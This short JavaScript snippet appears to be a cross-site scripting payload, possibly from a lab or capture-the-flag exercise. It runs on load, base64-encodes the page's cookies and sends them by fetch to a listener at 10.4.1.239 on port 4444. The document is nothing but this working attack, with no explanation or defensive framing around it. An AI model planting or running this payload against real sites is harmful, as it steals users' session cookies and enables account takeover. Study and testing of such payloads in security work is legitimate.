const LHOST = '10.4.1.239';
const PORT = '4444';

async function sendCookie() {
    await fetch(`http://${LHOST}:${PORT}?key=` + btoa(document.cookie));
}

sendCookie();
